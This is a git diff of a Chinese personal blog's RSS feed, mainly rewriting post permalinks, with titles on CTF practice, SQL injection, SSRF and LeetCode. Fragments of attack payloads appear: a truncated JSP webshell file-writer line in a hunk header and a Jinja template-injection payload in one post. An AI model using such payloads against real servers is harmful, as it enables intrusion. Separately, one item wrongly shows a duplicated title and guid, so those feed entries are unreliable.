-            <guid isPermalink="true">http://dpm12345.github.io/2022/09/23/sqli-labs-%E7%BB%83%E4%B9%A0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/29fef1ad/</guid>
             <title>sqli-labs 练习</title>
-            <link>http://dpm12345.github.io/2022/09/23/sqli-labs-%E7%BB%83%E4%B9%A0/</link>
+            <link>http://dpm12345.github.io/posts/29fef1ad/</link>
             <category>CTF</category>
             <category>sql注入</category>
             <pubDate>Fri, 23 Sep 2022 00:07:26 +0800</pubDate>
@@ -2323,9 +2323,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/09/09/CTF/SSRF/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/813434ca/</guid>
             <title>SSRF</title>
-            <link>http://dpm12345.github.io/2022/09/09/CTF/SSRF/</link>
+            <link>http://dpm12345.github.io/posts/813434ca/</link>
             <category>CTF</category>
             <category>SSRF</category>
             <pubDate>Fri, 09 Sep 2022 20:56:46 +0800</pubDate>
@@ -2366,9 +2366,9 @@ flag:  &lt;code&gt;$_[5].$_[13].$_[0].$_[6]&lt;/code&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/08/31/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%AD%A6%E4%B9%A0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/5463b311/</guid>
             <title>信息安全铁人三项学习</title>
-            <link>http://dpm12345.github.io/2022/08/31/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%AD%A6%E4%B9%A0/</link>
+            <link>http://dpm12345.github.io/posts/5463b311/</link>
             <pubDate>Wed, 31 Aug 2022 14:16:37 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;/%E7%B4%A0%E6%9D%90/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/target.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;/%E7%B4%A0%E6%9D%90/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
@@ -4464,9 +4464,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/08/28/CTF/SQL%E6%B3%A8%E5%85%A5/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/e73517db/</guid>
             <title>SQL注入</title>
-            <link>http://dpm12345.github.io/2022/08/28/CTF/SQL%E6%B3%A8%E5%85%A5/</link>
+            <link>http://dpm12345.github.io/posts/e73517db/</link>
             <category>CTF</category>
             <category>sql注入</category>
             <pubDate>Sun, 28 Aug 2022 13:01:48 +0800</pubDate>
@@ -4503,9 +4503,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/08/24/ms17-010-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/65089f0a/</guid>
             <title>ms17-010 漏洞复现</title>
-            <link>http://dpm12345.github.io/2022/08/24/ms17-010-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+            <link>http://dpm12345.github.io/posts/65089f0a/</link>
             <category>ms17</category>
             <category>msf</category>
             <pubDate>Wed, 24 Aug 2022 13:05:51 +0800</pubDate>
@@ -4551,9 +4551,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/08/13/qq-robot/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/ac16a623/</guid>
             <title>qq_robot</title>
-            <link>http://dpm12345.github.io/2022/08/13/qq-robot/</link>
+            <link>http://dpm12345.github.io/posts/ac16a623/</link>
             <pubDate>Sat, 13 Aug 2022 03:26:58 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;sql搜索&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql搜索&#34;&gt;#&lt;/a&gt; sql 搜索&lt;/h1&gt;
 &lt;p&gt;当报错 &lt;code&gt;Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation &#39;=&#39;&lt;/code&gt;&lt;/p&gt;
@@ -4562,9 +4562,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/07/23/CTF/MD5%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/558506d6/</guid>
             <title>MD5常见绕过</title>
-            <link>http://dpm12345.github.io/2022/07/23/CTF/MD5%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87/</link>
+            <link>http://dpm12345.github.io/posts/558506d6/</link>
             <category>CTF</category>
             <pubDate>Sat, 23 Jul 2022 23:10:32 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;0e-绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0e-绕过&#34;&gt;#&lt;/a&gt; 0e 绕过&lt;/h1&gt;
@@ -4641,9 +4641,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/07/23/CTF/HFUTC1CTF2021/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/d762243c/</guid>
             <title>HFUTC1CTF2021</title>
-            <link>http://dpm12345.github.io/2022/07/23/CTF/HFUTC1CTF2021/</link>
+            <link>http://dpm12345.github.io/posts/d762243c/</link>
             <category>CTF</category>
             <category>笔记</category>
             <pubDate>Sat, 23 Jul 2022 20:10:32 +0800</pubDate>
@@ -4698,9 +4698,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/07/23/git%E5%AD%A6%E4%B9%A0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/e28ceec1/</guid>
             <title>git学习</title>
-            <link>http://dpm12345.github.io/2022/07/23/git%E5%AD%A6%E4%B9%A0/</link>
+            <link>http://dpm12345.github.io/posts/e28ceec1/</link>
             <category>git</category>
             <pubDate>Sat, 23 Jul 2022 03:28:35 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;Git 为分布式版本控制工具&lt;/p&gt;
@@ -4736,9 +4736,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/07/22/CTF/kali_linux%20%E5%B7%A5%E5%85%B7/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/558506d6/</guid>
             <title>MD5常见绕过</title>
-            <link>http://dpm12345.github.io/2022/07/22/CTF/kali_linux%20%E5%B7%A5%E5%85%B7/</link>
+            <link>http://dpm12345.github.io/posts/558506d6/</link>
             <category>CTF</category>
             <category>kali</category>
             <category>nmap</category>
@@ -4866,9 +4866,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/07/22/%E5%BC%80%E5%90%AF%20ssh%20%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/9794bd28/</guid>
             <title>开启 ssh 远程登陆</title>
-            <link>http://dpm12345.github.io/2022/07/22/%E5%BC%80%E5%90%AF%20ssh%20%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86/</link>
+            <link>http://dpm12345.github.io/posts/9794bd28/</link>
             <pubDate>Fri, 22 Jul 2022 16:10:32 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;第一步-启动-ssh-服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一步-启动-ssh-服务&#34;&gt;#&lt;/a&gt; 第一步 启动 SSH 服务&lt;/h1&gt;
 &lt;p&gt;命令为：&lt;/p&gt;
@@ -4883,9 +4883,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/07/04/CTF/CTF/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/ccf5967e/</guid>
             <title>CTF</title>
-            <link>http://dpm12345.github.io/2022/07/04/CTF/CTF/</link>
+            <link>http://dpm12345.github.io/posts/ccf5967e/</link>
             <category>CTF</category>
             <pubDate>Mon, 04 Jul 2022 20:10:32 +0800</pubDate>
             <description><![CDATA[ &lt;h4 id=&#34;常见的网站源码备份文件后缀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的网站源码备份文件后缀&#34;&gt;#&lt;/a&gt; 常见的网站源码备份文件后缀&lt;/h4&gt;
@@ -5093,9 +5093,9 @@ if(request.getParameter(&amp;quot;f&amp;quot;)!=null)(new java.io.FileOutputStre
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__class__&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__base__&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;subclasses__&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/06/21/Qt/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/b511cbcf/</guid>
             <title>Qt</title>
-            <link>http://dpm12345.github.io/2022/06/21/Qt/</link>
+            <link>http://dpm12345.github.io/posts/b511cbcf/</link>
             <category>Qt</category>
             <pubDate>Tue, 21 Jun 2022 20:46:09 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#操作&#34;&gt;#&lt;/a&gt; 操作&lt;/h1&gt;
@@ -5162,9 +5162,9 @@ Myclass::Myclass()
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/04/08/CTF/Bugku%20CTF/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/7c4ba2c4/</guid>
             <title>Bugku CTF</title>
-            <link>http://dpm12345.github.io/2022/04/08/CTF/Bugku%20CTF/</link>
+            <link>http://dpm12345.github.io/posts/7c4ba2c4/</link>
             <category>CTF</category>
             <pubDate>Fri, 08 Apr 2022 10:10:32 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;签到&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#签到&#34;&gt;#&lt;/a&gt; 签到&lt;/h1&gt;
@@ -5399,9 +5399,9 @@ Myclass::Myclass()
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/03/18/leetcode/regular-exercise/%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/b6465ced/</guid>
             <title>两数相加</title>
-            <link>http://dpm12345.github.io/2022/03/18/leetcode/regular-exercise/%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0/</link>
+            <link>http://dpm12345.github.io/posts/b6465ced/</link>
             <category>哈希表</category>
             <category>链表</category>
             <pubDate>Fri, 18 Mar 2022 23:54:40 +0800</pubDate>
@@ -5481,9 +5481,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/03/18/leetcode/regular-exercise/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/d98ef1d2/</guid>
             <title>两数之和</title>
-            <link>http://dpm12345.github.io/2022/03/18/leetcode/regular-exercise/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</link>
+            <link>http://dpm12345.github.io/posts/d98ef1d2/</link>
             <category>数组</category>
             <category>哈希表</category>
             <pubDate>Fri, 18 Mar 2022 22:54:40 +0800</pubDate>
@@ -5509,9 +5509,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/03/18/leetcode/regular-exercise/%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/d10e2ef2/</guid>
             <title>无重复字符的最长字串</title>
-            <link>http://dpm12345.github.io/2022/03/18/leetcode/regular-exercise/%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/</link>
+            <link>http://dpm12345.github.io/posts/d10e2ef2/</link>
             <category>滑动窗口</category>
             <category>哈希表</category>
             <category>字符串</category>
@@ -5544,9 +5544,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/02/20/Data-Structure/my-achievement/%E4%BA%8C%E5%8F%89%E6%A0%91/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/e85d694a/</guid>
             <title>二叉树</title>
-            <link>http://dpm12345.github.io/2022/02/20/Data-Structure/my-achievement/%E4%BA%8C%E5%8F%89%E6%A0%91/</link>
+            <link>http://dpm12345.github.io/posts/e85d694a/</link>
             <category>树</category>
             <category>二叉树</category>
             <category>数据结构</category>
@@ -5802,9 +5802,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/01/24/leetcode/regular-exercise/%E6%9C%80%E5%B0%8F%E6%A0%88/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/5c639822/</guid>
             <title>最小栈</title>
-            <link>http://dpm12345.github.io/2022/01/24/leetcode/regular-exercise/%E6%9C%80%E5%B0%8F%E6%A0%88/</link>
+            <link>http://dpm12345.github.io/posts/5c639822/</link>
             <category>vector</category>
             <category>栈</category>
             <pubDate>Mon, 24 Jan 2022 22:54:40 +0800</pubDate>
@@ -5918,9 +5918,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/01/14/leetcode/regular-exercise/%E4%B8%91%E6%95%B0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/73645ce2/</guid>
             <title>丑数</title>
-            <link>http://dpm12345.github.io/2022/01/14/leetcode/regular-exercise/%E4%B8%91%E6%95%B0/</link>
+            <link>http://dpm12345.github.io/posts/73645ce2/</link>
             <category>动态规划</category>
             <pubDate>Fri, 14 Jan 2022 22:54:40 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;丑数，其所有因数均属于所给的数字集合，如对于因数 2，3，5，&lt;/p&gt;
@@ -6027,9 +6027,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/01/08/MFC/MFC%20%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C%E6%B1%87%E6%80%BB/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/c3305e01/</guid>
             <title>MFC 相关操作汇总</title>
-            <link>http://dpm12345.github.io/2022/01/08/MFC/MFC%20%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C%E6%B1%87%E6%80%BB/</link>
+            <link>http://dpm12345.github.io/posts/c3305e01/</link>
             <category>MFC</category>
             <pubDate>Sat, 08 Jan 2022 12:07:26 +0800</pubDate>
             <description><![CDATA[ &lt;h2 id=&#34;edit-编辑框文本不覆盖&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#edit-编辑框文本不覆盖&#34;&gt;#&lt;/a&gt; edit 编辑框文本不覆盖&lt;/h2&gt;
@@ -6098,9 +6098,9 @@ text.SetFont(&amp;amp;font);
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2022/01/04/Data-Structure/my-achievement/%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/3140d327/</guid>
             <title>队列实现</title>
-            <link>http://dpm12345.github.io/2022/01/04/Data-Structure/my-achievement/%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0/</link>
+            <link>http://dpm12345.github.io/posts/3140d327/</link>
             <category>数据结构</category>
             <category>队列</category>
             <pubDate>Tue, 04 Jan 2022 10:07:26 +0800</pubDate>
@@ -6552,9 +6552,9 @@ int Queue&amp;lt;T&amp;gt;::size()
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/31/leetcode/regular-exercise/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/45daaf11/</guid>
             <title>环形链表</title>
-            <link>http://dpm12345.github.io/2021/12/31/leetcode/regular-exercise/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/</link>
+            <link>http://dpm12345.github.io/posts/45daaf11/</link>
             <category>哈希表</category>
             <category>链表</category>
             <category>双指针（快慢指针）</category>
@@ -6672,9 +6672,79 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/28/leetcode/week-competition/leetcode%20%E7%AC%AC%2068%20%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/80d31d12/</guid>
+            <title>leetcode 第 273 场周赛</title>
+            <link>http://dpm12345.github.io/posts/80d31d12/</link>
+            <pubDate>Tue, 28 Dec 2021 23:20:34 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;【战绩】&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/%E7%B4%A0%E6%9D%90/leetcode%E7%AC%AC273%E5%9C%BA%E5%91%A8%E8%B5%9B_%E6%88%98%E7%BB%A9.png&#34; alt=&#34;leetcode第273场周赛_战绩&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;总结:&lt;/p&gt;
+&lt;p&gt;此次周赛，成绩差，只做出来了两题，并且第一题还提交错误一次。总的来说题目看得不够清楚，对题目的 推导还比较欠缺&lt;/p&gt;
+&lt;p&gt;总结到此，下面是题目解析&lt;/p&gt;
+&lt;h1 id=&#34;反转两次的数字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反转两次的数字&#34;&gt;#&lt;/a&gt; 反转两次的数字&lt;/h1&gt;
+&lt;p&gt;题目链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYS1udW1iZXItYWZ0ZXItYS1kb3VibGUtcmV2ZXJzYWwv&#34;&gt; 反转两次的数字&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;这道题比较简单，可以直接暴力进行两次数字反转得到答案&lt;/p&gt;
+&lt;p&gt;但仔细想想会发现，如果一个数字反转两次后是元素，那么原数字末尾必不为 0 (0 除外) ，因为如果存在 0 时 在进行反转后 0 会被删去，数字总位数减少，从而再次进行反转得到的数字必然不会是原来的数字&lt;/p&gt;
+&lt;p&gt;以下为代码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution &amp;#123;
+public:
+    bool isSameAfterReversals(int num) &amp;#123;
+        return num==0||num%10!=0;
+    &amp;#125;
+&amp;#125;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;执行所有后缀指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行所有后缀指令&#34;&gt;#&lt;/a&gt; 执行所有后缀指令&lt;/h1&gt;
+&lt;p&gt;题目链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvZXhlY3V0aW9uLW9mLWFsbC1zdWZmaXgtaW5zdHJ1Y3Rpb25zLXN0YXlpbmctaW4tYS1ncmlkLw==&#34;&gt; 执行所有后缀指令&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;按照题目要求模拟即可，注意什么时候是行，什么时候是列即可&lt;/p&gt;
+&lt;p&gt;代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution &amp;#123;
+public:
+    vector&amp;lt;int&amp;gt; executeInstructions(int n, vector&amp;lt;int&amp;gt;&amp;amp; startPos, string s) &amp;#123;
+        vector&amp;lt;int&amp;gt;ans(s.size());
+        for(int i=0;i&amp;lt;s.size();i++)
+        &amp;#123;
+            int j=0,num=0;
+            vector&amp;lt;int&amp;gt;cur=startPos;
+            for(j=i;j&amp;lt;s.size();j++)
+            &amp;#123;
+                if(s[j]==&#39;L&#39;&amp;amp;&amp;amp;cur[1]&amp;gt;0)
+                &amp;#123;
+                    cur[1]--;
+                    num++;
+                &amp;#125;
+                else if(s[j]==&#39;R&#39;&amp;amp;&amp;amp;cur[1]&amp;lt;n-1)
+                &amp;#123;
+                    cur[1]++;
+                    num++;
+                &amp;#125;
+                else if(s[j]==&#39;U&#39;&amp;amp;&amp;amp;cur[0]&amp;gt;0)
+                &amp;#123;
+                    cur[0]--;
+                    num++;
+                &amp;#125;   
+                else if(s[j]==&#39;D&#39;&amp;amp;&amp;amp;cur[0]&amp;lt;n-1)
+                &amp;#123;
+                    cur[0]++;
+                    num++;
+                &amp;#125;
+                else
+                    break;
+            &amp;#125;
+            ans[i]=num;
+            
+        &amp;#125;
+        return ans;
+        
+    &amp;#125;
+&amp;#125;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;相同元素的间隔之和&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相同元素的间隔之和&#34;&gt;#&lt;/a&gt; 相同元素的间隔之和&lt;/h1&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/274338ea/</guid>
             <title>leetcode 第 68 场双周赛</title>
-            <link>http://dpm12345.github.io/2021/12/28/leetcode/week-competition/leetcode%20%E7%AC%AC%2068%20%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/</link>
+            <link>http://dpm12345.github.io/posts/274338ea/</link>
             <pubDate>Tue, 28 Dec 2021 23:20:34 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;【战绩】&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;/%E7%B4%A0%E6%9D%90/leetcode%E7%AC%AC68%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B_%E6%88%98%E7%BB%A9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
@@ -6881,79 +6951,9 @@ public:
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/28/leetcode/week-competition/leetcode%20%E7%AC%AC%20273%20%E5%9C%BA%E5%91%A8%E8%B5%9B/</guid>
-            <title>leetcode 第 273 场周赛</title>
-            <link>http://dpm12345.github.io/2021/12/28/leetcode/week-competition/leetcode%20%E7%AC%AC%20273%20%E5%9C%BA%E5%91%A8%E8%B5%9B/</link>
-            <pubDate>Tue, 28 Dec 2021 23:20:34 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;【战绩】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/%E7%B4%A0%E6%9D%90/leetcode%E7%AC%AC273%E5%9C%BA%E5%91%A8%E8%B5%9B_%E6%88%98%E7%BB%A9.png&#34; alt=&#34;leetcode第273场周赛_战绩&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;总结:&lt;/p&gt;
-&lt;p&gt;此次周赛，成绩差，只做出来了两题，并且第一题还提交错误一次。总的来说题目看得不够清楚，对题目的 推导还比较欠缺&lt;/p&gt;
-&lt;p&gt;总结到此，下面是题目解析&lt;/p&gt;
-&lt;h1 id=&#34;反转两次的数字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反转两次的数字&#34;&gt;#&lt;/a&gt; 反转两次的数字&lt;/h1&gt;
-&lt;p&gt;题目链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYS1udW1iZXItYWZ0ZXItYS1kb3VibGUtcmV2ZXJzYWwv&#34;&gt; 反转两次的数字&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;这道题比较简单，可以直接暴力进行两次数字反转得到答案&lt;/p&gt;
-&lt;p&gt;但仔细想想会发现，如果一个数字反转两次后是元素，那么原数字末尾必不为 0 (0 除外) ，因为如果存在 0 时 在进行反转后 0 会被删去，数字总位数减少，从而再次进行反转得到的数字必然不会是原来的数字&lt;/p&gt;
-&lt;p&gt;以下为代码&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution &amp;#123;
-public:
-    bool isSameAfterReversals(int num) &amp;#123;
-        return num==0||num%10!=0;
-    &amp;#125;
-&amp;#125;;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&#34;执行所有后缀指令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行所有后缀指令&#34;&gt;#&lt;/a&gt; 执行所有后缀指令&lt;/h1&gt;
-&lt;p&gt;题目链接:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvZXhlY3V0aW9uLW9mLWFsbC1zdWZmaXgtaW5zdHJ1Y3Rpb25zLXN0YXlpbmctaW4tYS1ncmlkLw==&#34;&gt; 执行所有后缀指令&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;按照题目要求模拟即可，注意什么时候是行，什么时候是列即可&lt;/p&gt;
-&lt;p&gt;代码如下&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution &amp;#123;
-public:
-    vector&amp;lt;int&amp;gt; executeInstructions(int n, vector&amp;lt;int&amp;gt;&amp;amp; startPos, string s) &amp;#123;
-        vector&amp;lt;int&amp;gt;ans(s.size());
-        for(int i=0;i&amp;lt;s.size();i++)
-        &amp;#123;
-            int j=0,num=0;
-            vector&amp;lt;int&amp;gt;cur=startPos;
-            for(j=i;j&amp;lt;s.size();j++)
-            &amp;#123;
-                if(s[j]==&#39;L&#39;&amp;amp;&amp;amp;cur[1]&amp;gt;0)
-                &amp;#123;
-                    cur[1]--;
-                    num++;
-                &amp;#125;
-                else if(s[j]==&#39;R&#39;&amp;amp;&amp;amp;cur[1]&amp;lt;n-1)
-                &amp;#123;
-                    cur[1]++;
-                    num++;
-                &amp;#125;
-                else if(s[j]==&#39;U&#39;&amp;amp;&amp;amp;cur[0]&amp;gt;0)
-                &amp;#123;
-                    cur[0]--;
-                    num++;
-                &amp;#125;   
-                else if(s[j]==&#39;D&#39;&amp;amp;&amp;amp;cur[0]&amp;lt;n-1)
-                &amp;#123;
-                    cur[0]++;
-                    num++;
-                &amp;#125;
-                else
-                    break;
-            &amp;#125;
-            ans[i]=num;
-            
-        &amp;#125;
-        return ans;
-        
-    &amp;#125;
-&amp;#125;;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&#34;相同元素的间隔之和&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相同元素的间隔之和&#34;&gt;#&lt;/a&gt; 相同元素的间隔之和&lt;/h1&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://dpm12345.github.io/2021/12/26/leetcode/regular-exercise/%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</guid>
+            <guid isPermalink="true">http://dpm12345.github.io/posts/4a8b7903/</guid>
             <title>方法总结</title>
